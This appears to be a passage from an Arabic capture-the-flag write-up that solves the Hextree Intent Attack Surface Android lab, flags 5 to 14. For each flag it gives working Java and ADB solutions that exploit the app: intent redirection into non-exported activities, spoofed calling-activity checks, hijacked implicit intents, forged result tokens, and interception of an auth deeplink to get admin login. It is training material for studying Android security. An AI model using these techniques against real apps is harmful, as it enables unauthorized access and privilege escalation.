الاستدعاءات (استدعاء activity)، باستخدام SolvedPreferences. حسب الحالة الحالية والـ action للـ Intent الجاي، بينتقل للحالة اللي بعدها أو يعيد تشغيل العملية. بس لو تعدي كل الحالات صح بالترتيب (INIT ➔ PREPARE ➔ BUILD ➔ GET_FLAG)، هيديك الـ flag الحل #\rطيب المفروض نبعتهم بالترتيب ده؟ جربت وفشل، ليه؟ ده لأن لما تبعتهم بالترتيب التصاعدي، آخر intent هيكون أول حاجة المستخدم يتعامل معاها فهيبدأ من الآخر (ترتيب عكسي).\nده ما يعرف ب activity back stack في الأندرويد او Last-In-First-Out (LIFO) (الاخير هو الاول في الظهور) ف حل بسيط يكون إنك تبعت intents بترتيب عكسي من الأول\nIntent TheKey = new Intent(); TheKey.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); startActivity(TheKey); Intent getFlagIntent = new Intent(); getFlagIntent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag4Activity\u0026#34;)); getFlagIntent.setAction(\u0026#34;GET_FLAG_ACTION\u0026#34;); startActivity(getFlagIntent); Intent buildIntent = new Intent(); buildIntent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag4Activity\u0026#34;)); buildIntent.setAction(\u0026#34;BUILD_ACTION\u0026#34;); startActivity(buildIntent); Intent prepareIntent = new Intent(); prepareIntent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag4Activity\u0026#34;)); prepareIntent.setAction(\u0026#34;PREPARE_ACTION\u0026#34;); startActivity(prepareIntent); Flag 5 #\rتحليل الكود #\rpublic void onCreate(Bundle bundle) { Intent intent = getIntent(); Intent intent2 = (Intent) intent.getParcelableExtra(\u0026#34;android.intent.extra.INTENT\u0026#34;); if (intent2 == null || intent2.getIntExtra(\u0026#34;return\u0026#34;, -1) != 42) { return; } this.f.addTag(42); Intent intent3 = (Intent) intent2.getParcelableExtra(\u0026#34;nextIntent\u0026#34;); this.nextIntent = intent3; if (intent3 == null || intent3.getStringExtra(\u0026#34;reason\u0026#34;) == null) { return; } this.f.addTag(\u0026#34;nextIntent\u0026#34;); if (this.nextIntent.getStringExtra(\u0026#34;reason\u0026#34;).equals(\u0026#34;back\u0026#34;)) { this.f.addTag(this.nextIntent.getStringExtra(\u0026#34;reason\u0026#34;)); success(this); } else if (this.nextIntent.getStringExtra(\u0026#34;reason\u0026#34;).equals(\u0026#34;next\u0026#34;)) { intent.replaceExtras(new Bundle()); startActivity(this.nextIntent); } } هنا الكود بيحاول ياخد data من intent اللي فيه intent تاني كـ extra data لما الـ intent يتفك، الـ activity هيشغله لنا باستخدام startActivity()\nintent2 لازم يكون فيه int extra \u0026quot;return\u0026quot; بقيمة 42. intent2 لازم يكون فيه nested parcelable intent تحت \u0026quot;nextIntent\u0026quot;. nextIntent لازم يكون فيه string extra \u0026quot;reason\u0026quot; بقيمة \u0026quot;back\u0026quot;. intet -\u0026gt; intent2(\u0026quot;return\u0026quot;,42) -\u0026gt; intent3(\u0026quot;reason\u0026quot;, \u0026quot;back)\nالحل #\rIntent intent3 = new Intent(); intent3.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); intent3.putExtra(\u0026#34;reason\u0026#34;,\u0026#34;back\u0026#34;); Intent intent2 = new Intent(); intent2.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); intent2.putExtra(\u0026#34;return\u0026#34;, 42); intent2.putExtra(\u0026#34;nextIntent\u0026#34;, intent3); Intent intent = new Intent(); intent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); intent.putExtra(\u0026#34;android.intent.extra.INTENT\u0026#34;, intent2); startActivity(intent); Flag 6 #\rتحليل الكود #\rpublic void onCreate(Bundle bundle) { if ((getIntent().getFlags() \u0026amp; 1) != 0) { this.f.addTag(\u0026#34;FLAG_GRANT_READ_URI_PERMISSION\u0026#34;); success(this); } } بسيط، بس نبعت intent مع FLAG_GRANT_READ_URI_PERMISSION\u0026quot; flag \u0026hellip;. صح؟\n\u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag6Activity\u0026#34; android:exported=\u0026#34;false\u0026#34;/\u0026gt; بس من الـ xml الـ activity مش exported يعني منقدرش نبعت مباشرة\nيعني عايزين حاجة فيها startActivity() ونقدر نناديها عشان لما نديها intent تروح من \u0026ldquo;Activity A\u0026rdquo; ل \u0026ldquo;Activity B\u0026rdquo; ال مkقدرش نناديه مباشرة\nActivity 5 فيه المطلوب ده\nif (this.nextIntent.getStringExtra(\u0026#34;reason\u0026#34;).equals(\u0026#34;back\u0026#34;)) { this.f.addTag(this.nextIntent.getStringExtra(\u0026#34;reason\u0026#34;)); success(this); } else if (this.nextIntent.getStringExtra(\u0026#34;reason\u0026#34;).equals(\u0026#34;next\u0026#34;)) { intent.replaceExtras(new Bundle()); startActivity(this.nextIntent); } الحل #\rهنستخدم الحل اللي فات بس نغير الـ extra text في intent3 من back -\u0026gt; next، والـ class اللي بنناديه ونديله الـ permissions المطلوبة .FLAG_GRANT_READ_URI_PERMISSION\nIntent intent3 = new Intent(); intent3.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag6Activity\u0026#34;)); intent3.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); intent3.putExtra(\u0026#34;reason\u0026#34;,\u0026#34;next\u0026#34;); Intent intent2 = new Intent(); intent2.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); intent2.putExtra(\u0026#34;return\u0026#34;, 42); intent2.putExtra(\u0026#34;nextIntent\u0026#34;, intent3); Intent intent = new Intent(); intent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); intent.putExtra(\u0026#34;android.intent.extra.INTENT\u0026#34;, intent2); startActivity(intent); Flag 7 #\rتحليل الكود #\rpublic void onCreate(Bundle bundle) { String action = getIntent().getAction(); if (action == null || !action.equals(\u0026#34;OPEN\u0026#34;)) { return; } this.f.addTag(\u0026#34;OPEN\u0026#34;); } public void onNewIntent(Intent intent) { super.onNewIntent(intent); String action = intent.getAction(); if (action == null || !action.equals(\u0026#34;REOPEN\u0026#34;)) { return; } this.f.addTag(\u0026#34;REOPEN\u0026#34;); success(this); } الـ intent المستقبل، محتوى الـ Action هيتشيك للـ \u0026quot;OPEN\u0026quot;. بس عشان نوصل لـ success() محتاجين onNewIntent() اللي:\nبيجيب action string من الـ intent الجديد الجاي. لو الـ action null أو مش يساوي \u0026quot;REOPEN\u0026quot;، بيخرج/return. لو الـ action هو \u0026quot;REOPEN\u0026quot;، بيضيف الـ tag \u0026quot;REOPEN\u0026quot; وينادي success(this). بس إزاي نشغل onNewIntent()؟ الـ method ده جزء من Activity lifecycle وبيتشغل بس لما:\nالـ activity تكون شغالة فعلاً، وتشتغل بـ intent مابيعملش instance جديد (يعني نستخدم نفس الصفحة و لو فيها بيانات نكمل عليها مش كل ما نبعت نبتدي من الصفر) و ده حسب launch mode أو intent flags. الحل #\rباستخدام ADB:\nadb shell am start -n io.hextree.attacksurface/.activities.Flag7Activity -a OPEN sleep 1 am start -n io.hextree.attacksurface/.activities.Flag7Activity -a REOPEN --activity-single-top أو سطر واحد زي:\nadb shell \u0026#34;am start -n io.hextree.attacksurface/.activities.Flag7Activity -a OPEN \u0026amp;\u0026amp; sleep 1 \u0026amp;\u0026amp; am start -n io.hextree.attacksurface/.activities.Flag7Activity -a REOPEN --activity-single-top\u0026#34; ده بس بيشغل shell على الجهاز ويستخدم activity manager am اللي بيشغل الـ Flag7Activity مع action OPEN بعدين يتوقف ثانية واحدة عشان يتأكد إن الـ activity اشتغل و اتحمل و تقدر تتفاعل معاه. بعدين يشغله تاني مع action REOPEN ويجبره يشتغل single-top عشان يستخدم الـ activity مش يبدأ واحد جديد\nباستخدام java:\nلو الـ activity بيبدأ بسرعة، مش محتاج delay: Intent firstIntent = new Intent(); firstIntent.setClassName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag7Activity\u0026#34; ); firstIntent.setAction(\u0026#34;OPEN\u0026#34;); startActivity(firstIntent); Intent reopenIntent = new Intent(); reopenIntent.setAction(\u0026#34;REOPEN\u0026#34;); // مطلوب عشان نشغل success() reopenIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT); reopenIntent.setClassName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag7Activity\u0026#34; ); startActivity(reopenIntent); باستخدام delay: Intent openIntent = new Intent(); openIntent.setClassName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag7Activity\u0026#34; ); openIntent.setAction(\u0026#34;OPEN\u0026#34;); startActivity(openIntent); // 2. بعد delay، نبعت \u0026#34;REOPEN\u0026#34; intent عشان نشغل onNewIntent new Handler(Looper.getMainLooper()).postDelayed(() -\u0026gt; { Intent reopenIntent = new Intent(); reopenIntent.setClassName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag7Activity\u0026#34; ); reopenIntent.setAction(\u0026#34;REOPEN\u0026#34;); reopenIntent.addFlags( Intent.FLAG_ACTIVITY_SINGLE_TOP | // استخدم الـ activity الموجود Intent.FLAG_ACTIVITY_CLEAR_TOP // امسح instances تانية ); startActivity(reopenIntent); }, 1000); // delay ثانية واحدة عشان نتأكد إن الـ activity شغال باستخدام single_Top flag: Intent firstIntent = new Intent(); firstIntent.setClassName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag7Activity\u0026#34; ); firstIntent.setAction(\u0026#34;OPEN\u0026#34;); startActivity(firstIntent); try { Thread.sleep(1000); } catch (Exception e) {} Intent reopenIntent = new Intent(); reopenIntent.setAction(\u0026#34;REOPEN\u0026#34;); // مطلوب عشان نشغل success() reopenIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT); reopenIntent.setClassName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag7Activity\u0026#34; ); startActivity(reopenIntent); استخدام single_Top flag كفاية بس ممكن تحتاج flags زيادة في سيناريوهات مختلفة زي في حالات activity تاني يحاول يكون فوق مكان التطبيق العاوز تهجم علية الخ الخ الخ\u0026hellip;.\nلمعلومات أكتر شوف [[android life cycle]]\nFlag 8 #\rتحليل الكود #\rComponentName callingActivity = getCallingActivity(); if (callingActivity != null) { if (callingActivity.getClassName().contains(\u0026#34;Hextree\u0026#34;)) { this.f.addTag(\u0026#34;calling class contains \u0026#39;Hextree\u0026#39;\u0026#34;); success(this); } else { Log.i(\u0026#34;Flag8\u0026#34;, \u0026#34;access denied\u0026#34;); setResult(0, getIntent()); } } الـ Activity ده بيجيب معلومات عن الـ activity اللي شغله باستخدام getCallingActivity(). ده بيرجع ComponentName object يحدد هوية الـ calling activity (مين الباشا البيكلمنا). بعدين بيشيك لو الـ activity الحالي اتشغل من activity تاني باستخدام startActivityForResult() (calling activity) بعدين بيشيك لو اسم class الخاص بالـ calling activity فيه string \u0026ldquo;Hextree\u0026rdquo; الحل #\rعشان أحل ده عملت class هيكون ليه الاسم المطلوب\npublic class Hextree extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { Intent intent = new Intent(); intent.setComponent(new ComponentName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag8Activity\u0026#34;)); startActivityForResult(intent,42); } } Flag 9 #\rتحليل الكود #\rComponentName callingActivity = getCallingActivity(); if (callingActivity == null || !callingActivity.getClassName().contains(\u0026#34;Hextree\u0026#34;)) { return; } Intent intent = new Intent(\u0026#34;flag\u0026#34;); this.f.addTag(intent); this.f.addTag(42); intent.putExtra(\u0026#34;flag\u0026#34;, this.f.appendLog(this.flag)); setResult(-1, intent); finish(); success(this); الـ Activity دي بتجيب معلومات عن الـ activity اللي شغاله باستخدام getCallingActivity(). ده بيرجع ComponentName object يحدد هوية الـ calling activity.\nبعدين بيشيك لو الـ activity الحالي اتشغل من activity تاني باستخدام startActivityForResult() (calling activity) بعدين بيشيك لو اسم class الخاص بالـ calling activity فيه string \u0026ldquo;Hextree\u0026rdquo; الفرق الوحيد بين ده والـ Flag 8 هو هنطبق onActivityResult()\nالحل #\rpublic class Hextree extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); EdgeToEdge.enable(this); setContentView(R.layout.activity_hextree); Intent intent = new Intent(); intent.setComponent(new ComponentName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag9Activity\u0026#34;)); startActivityForResult(intent,42); ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -\u0026gt; { Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars()); v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom); return insets; }); } @Override protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) { super.onActivityResult(requestCode, resultCode, data); if (requestCode == 42) { Utils.showDialog(this, data); } } } Flag 10 #\rتحليل الكود #\rif (getIntent().getAction() == null) { Toast.makeText(this, \u0026#34;Sending implicit intent with the flag\\nio.hextree.attacksurface.ATTACK_ME\u0026#34;, 1).show(); Intent intent = new Intent(\u0026#34;io.hextree.attacksurface.ATTACK_ME\u0026#34;); intent.addFlags(8); this.f.addTag(intent); intent.putExtra(\u0026#34;flag\u0026#34;, this.f.appendLog(this.flag)); try { startActivity(intent); success(this); } catch (RuntimeException e) { e.printStackTrace(); Toast.makeText(this, \u0026#34;No app found to handle the intent\\nio.hextree.attacksurface.ATTACK_ME\u0026#34;, 1).show(); finish(); } } لما intent يتبعت للـ activity ده ومافيش action مكتوب، في Toast message هتظهر و intent هيتعمل ب \u0026quot;io.hextree.attacksurface.ATTACK_ME\u0026quot; action وشوية flags و data هتتحط عشان تتبعت مع الـ intent\n\u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag10Activity\u0026#34; android:exported=\u0026#34;false\u0026#34;/\u0026gt; بس من الـ xml مkقدرش نناديه مباشرة؟\nالحل #\r***هنا الـ تطبيق بيساعدنا لما نضغط على رقم challenge منه هو الهيبدأه لينا ويبعت الـ intent\nنعمل Intent-filter يسمع للـ action \u0026quot;io.hextree.attacksurface.ATTACK_ME\u0026quot; وفي الـ activity نجيب الـ intent ونقرا محتواه.\n\u0026lt;activity android:name=\u0026#34;.implicitIntent\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;io.hextree.attacksurface.ATTACK_ME\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; Intent recivedIntent = getIntent(); Utils.showDialog(this,recivedIntent); طبعا في الحقيقة ممكن تتعامل مع المحتوى جوا الـ intent و تعدل علية او ترجعة و هكذا\nأو لو الـ app مساعدناش إيه رأيك نعمل حاجة تانية زي اللي عملناه في Flag 6!\nهنعدي أول 2 checks من activity 5 وفي التالت هننادي activity 10 بس من غير ما نضيف flags مناسبة، الـ intents هتفضل تنادي بعض ده هيعمل infinite loop، عشان أحل ده ضفت حاجتين\nالـ flags دول بيتستخدموا عشان نتحكم في سلوك الـ activity stack (back stack) لما نشغل activity جديدة.\nالأول Intent.FLAG_ACTIVITY_CLEAR_TOP :\nالهدف: بيمسح كل الـ activities اللي فوق الـ target activity في الـ stack الوظيفة: لو الـ activity موجود فعلاً في الـ stack، هيتجاب قدام كل الـ activities اللي فوقه هتتمسح لو اتستخدم لوحده، هيعمل instance جديد من الـ activity by default (يعيده من الاول) الثاني Intent.FLAG_ACTIVITY_SINGLE_TOP :\nالهدف: بيمنع عمل instances كتير من نفس الـ activity الوظيفة: لو الـ activity موجودة فوق في الـ stack، مش هيعمل instance جديد بدلاً من كده، onNewIntent() هتنادى على الـ instance الموجود لو الـ activity موجود بس مش فوق، instance جديدة هتتعمل Intent intent3 = new Intent(); intent3.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag10Activity\u0026#34;)); intent3.putExtra(\u0026#34;reason\u0026#34;,\u0026#34;next\u0026#34;); Intent intent2 = new Intent(); intent2.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); intent2.putExtra(\u0026#34;return\u0026#34;, 42); intent2.putExtra(\u0026#34;nextIntent\u0026#34;, intent3); Intent intent = new Intent(); intent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); intent.putExtra(\u0026#34;android.intent.extra.INTENT\u0026#34;, intent2); intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP); startActivity(intent); finish(); Flag 11 #\rتحليل الكود #\rpublic void onCreate(Bundle bundle) { super.onCreate(bundle); this.f = new LogHelper(this); if (getIntent().getAction() == null) { Toast.makeText(this, \u0026#34;Sending implicit intent to\\nio.hextree.attacksurface.ATTACK_ME\u0026#34;, 1).show(); Intent intent = new Intent(\u0026#34;io.hextree.attacksurface.ATTACK_ME\u0026#34;); intent.addFlags(8); try { startActivityForResult(intent, 42); } catch (RuntimeException e) { e.printStackTrace(); Toast.makeText(this, \u0026#34;No app found to handle the intent\\nio.hextree.attacksurface.ATTACK_ME\u0026#34;, 1).show(); finish(); } } } public void onActivityResult(int i, int i2, Intent intent) { if (intent != null \u0026amp;\u0026amp; intent.getIntExtra(\u0026#34;token\u0026#34;, -1) == 1094795585) { this.f.addTag(1094795585); success(this); } super.onActivityResult(i, i2, intent); } زي الـ Activity اللي فاتت ده بيشوف هل intent فاضي ؟ بس دلوقتي هيبدأه وهو مستني results عن طريق startActivityForResult، الـ Intent محتاج يكون فيه token كـ extra بقيمة 1094795585\nالحل #\rالـ xml زي اللي فات ونقدر نستخدم نفس الـ intent (اللي استقبلناه من activity11) ونضغط على flag11 من الـ app (Intent Attack Surface)\nIntent recivedIntent = getIntent(); Utils.showDialog(this,recivedIntent); // عشان نرجع result recivedIntent.putExtra(\u0026#34;token\u0026#34;,1094795585); setResult(RESULT_OK, recivedIntent); finish() أو ناخد الطريق الطويل الصعب\nده كان صعب لأن الـ intent الجه كان فاضي بس ده ممكن يكون مشكلة من عندي فقررت أفصلهم على 2 activities (واحد يبدأ request والتاني يستقبل ويبعت intent تاني)\nبس واجهت مشاكل زي flag10 ولأن الـ flags اللي ضفتها مسحت instance الخاص بـ activity11 فحتى لو ناديته وبعتلي intent ميقدرش يرجعله لأن الـ instance المحدد ده اتقفل فعشان أحل ده ضفت نفس الـ flag عشان حتى لو اتقفل يتشغل تاني\nضفت method finish عشان أقفل الـ activities دي و توقف instance الخاص بـ activity 11 \u0026amp; 5 في الـ background و اقدر أبعت الـ result بتاعي\nIntent intent3 = new Intent(); intent3.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag11Activity\u0026#34;)); intent3.putExtra(\u0026#34;reason\u0026#34;,\u0026#34;next\u0026#34;); intent3.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP); Intent intent2 = new Intent(); intent2.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); intent2.putExtra(\u0026#34;return\u0026#34;, 42); intent2.putExtra(\u0026#34;nextIntent\u0026#34;, intent3); Intent intent = new Intent(); intent.setComponent(new ComponentName( \u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag5Activity\u0026#34;)); intent.putExtra(\u0026#34;android.intent.extra.INTENT\u0026#34;, intent2); intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP); startActivity(intent); finish(); Intent recivedIntent = getIntent(); Utils.showDialog(this,recivedIntent); // عشان نرجع result recivedIntent.putExtra(\u0026#34;token\u0026#34;,1094795585); setResult(RESULT_OK, recivedIntent); finish(); Flag 12 #\rتحليل الكود #\r\u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag12Activity\u0026#34; android:exported=\u0026#34;true\u0026#34;/\u0026gt; وأيوة نقدر نبعته مباشرة لـ activity\npublic void onCreate(Bundle bundle) { if (getIntent().getAction() == null) { Intent intent = new Intent(\u0026#34;io.hextree.attacksurface.ATTACK_ME\u0026#34;); intent.addFlags(8); startActivityForResult(intent, 42); } } } public void onActivityResult(int i, int i2, Intent intent) { super.onActivityResult(i, i2, intent); if (intent == null || getIntent() == null || !getIntent().getBooleanExtra(\u0026#34;LOGIN\u0026#34;, false)) { return; } this.f.addTag(\u0026#34;LOGIN\u0026#34;); if (intent.getIntExtra(\u0026#34;token\u0026#34;, -1) == 1094795585) { this.f.addTag(1094795585); success(this); } محتاجين نبعت intent فاضي بعدين هيبعت intent بـ action \u0026quot;io.hextree.attacksurface.ATTACK_ME\u0026quot;، بعدين نبعت intent مع Boolean \u0026quot;LOGIN\u0026quot; true و extra \u0026quot;token\u0026quot; 1094795585\nالحل #\rIntent wakeUp= new Intent(); wakeUp.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag12Activity\u0026#34;); startActivity(wakeUp); Intent intent2 = new Intent(); intent2.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag12Activity\u0026#34;); intent2.putExtra(\u0026#34;LOGIN\u0026#34;, true); startActivity(intent2); Intent receivedIntent = getIntent(); receivedIntent.putExtra(\u0026#34;token\u0026#34;, 1094795585); // التشيك على الرقم السحري setResult(RESULT_OK, receivedIntent); finish(); Flag 13 #\rتحليل الكود #\r\u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag15Activity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;hex\u0026#34;/\u0026gt; \u0026lt;data android:host=\u0026#34;open\u0026#34;/\u0026gt; \u0026lt;data android:host=\u0026#34;flag\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; هنا الـ activity بيسمع لـ intent ممكن يجي من browser بـ scheme (protocol) :hex و host (domain) : open أو flag\nprivate boolean isDeeplink(Intent intent) { String action; return ( intent == null || (action = intent.getAction()) == null || !action.equals(\u0026#34;android.intent.action.VIEW\u0026#34;) || !intent.getCategories().contains(\u0026#34;android.intent.category.BROWSABLE\u0026#34;)|| intent.getStringExtra(\u0026#34;com.android.browser.application_id\u0026#34;) == null ) ? false : true; } public void onCreate(Bundle bundle) { Intent intent = getIntent(); if (intent == null) { finish(); } if (isDeeplink(intent)) { Uri data = intent.getData(); if (data.getHost().equals(\u0026#34;flag\u0026#34;) \u0026amp;\u0026amp; data.getQueryParameter(\u0026#34;action\u0026#34;).equals(\u0026#34;give-me\u0026#34;)) { success(this); return; } else { if ( !data.getHost().equals(\u0026#34;open\u0026#34;) || data.getQueryParameter(\u0026#34;message\u0026#34;) == null) { return; } return; } } Intent intent2 = new Intent(\u0026#34;android.intent.action.VIEW\u0026#34;); intent2.setData(Uri.parse(\u0026#34;https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=hex://open?message=Hello+World\u0026#34;)); startActivity(intent2); } الـ activity هيشتغل لما ياخد intent اللي هو Deeplink:\nمش فاضي فيه action android.intent.action.VIEW فيه category \u0026quot;android.intent.category.BROWSABLE\u0026quot; فيه extra string \u0026quot;com.android.browser.application_id\u0026quot; مش فاضي data جوا الـ Deeplink:\nHost هو flag parameter \u0026quot;action\u0026quot; بقيمة \u0026quot;give-me\u0026quot; الحل #\rهنستخدم الموقع المتاح عشان نحل التحديات اللي بتتضمن بعت url requests للـ app بتاعنا وهو هيتعامل مع إنشاء الـ deeplinks لنا\nhex://flag?action=give-me Flag 14 #\rتحليل الكود #\r\u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag14Activity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;hex\u0026#34; android:host=\u0026#34;token\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; الـ actions والـ scheme زي flag13 بس الـ host دلوقتي بس token\npublic void onCreate(Bundle bundle) { if (intent.getAction() == null) { Intent intent2 = new Intent(\u0026#34;android.intent.action.VIEW\u0026#34;); String uuid = UUID.randomUUID().toString(); SolvedPreferences.putString(getPrefixKey(\u0026#34;challenge\u0026#34;), uuid); intent2.setData( Uri.parse(\u0026#34;https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-app-auth?authChallenge=\u0026#34; + uuid)); startActivity(intent2); return; } if (intent.getAction().equals(\u0026#34;android.intent.action.VIEW\u0026#34;)) { Uri data = intent.getData(); String queryParameter = data.getQueryParameter(\u0026#34;type\u0026#34;); String queryParameter2 = data.getQueryParameter(\u0026#34;authToken\u0026#34;); String queryParameter3 = data.getQueryParameter(\u0026#34;authChallenge\u0026#34;); String string = SolvedPreferences.getString(getPrefixKey(\u0026#34;challenge\u0026#34;)); if (queryParameter == null || queryParameter2 == null || queryParameter3 == null || !queryParameter3.equals(string)) { Toast.makeText(this, \u0026#34;Invalid login\u0026#34;, 1).show(); finish(); return; } this.f.addTag(queryParameter); try { String encodeToString = Base64.getEncoder().encodeToString(MessageDigest.getInstance(\u0026#34;SHA-256\u0026#34;).digest(queryParameter2.getBytes())); if (encodeToString.equals(\u0026#34;a/AR9b0XxHEX7zrjx5KNOENTqbsPi6IsX+MijDA/92w=\u0026#34;)) { if (queryParameter.equals(\u0026#34;user\u0026#34;)) { Toast.makeText(this, \u0026#34;User login successful\u0026#34;, 1).show(); } else if (queryParameter.equals(\u0026#34;admin\u0026#34;)) { Log.i(\u0026#34;Flag14\u0026#34;, \u0026#34;hash: \u0026#34; + encodeToString); this.f.addTag(queryParameter2); Toast.makeText(this, \u0026#34;Admin login successful\u0026#34;, 1).show(); success(this); } } } } لو مافيش intent وصل للـ activity هيعمل activity عشان يشغل login portal ويوديناللموقع اللي فيه زرار عشان نكمل تسجيل دخول ولما نضغط عليه المستخدم يكمل بأمان لأن intent هيتبعت للـ activity ده وهتسجل دخول كـ user\u0026hellip;. بس احنا عايزين admin\u0026hellip;..\nالحل #\rعشان نجيب admin محتاجين نعدل الـ type parameter نعمل activity هيعترض ويبعته تاني مع intent جديد بالـ data اللي عايزينها بس نتأكد إنه uri مش بس نحطه كـ string يعني web101\n\u0026lt;activity android:name=\u0026#34;.SecondActivity\u0026#34; android:exported=\u0026#34;true\u0026#34; \u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;hex\u0026#34; android:host=\u0026#34;token\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; Intent intent = getIntent(); Utils.showDialog(this,intent); Uri data = intent.getData(); //String query_parmaeter1 =\u0026#34;type = \u0026#34; + data.getQueryParameter(\u0026#34;type\u0026#34;); //String query_parmaeter2 = \u0026#34;authToken = \u0026#34; + data.getQueryParameter(\u0026#34;authToken\u0026#34;); //String query_parmaeter3 = \u0026#34;authChallenge = \u0026#34; +data.getQueryParameter(\u0026#34;authChallenge\u0026#34;); //Log.d(\u0026#34;data\u0026#34;, data.toString()); //Log.d(\u0026#34;query_parmaeter1\u0026#34;, query_parmaeter1); //Log.d(\u0026#34;query_parmaeter2\u0026#34;, query_parmaeter2); 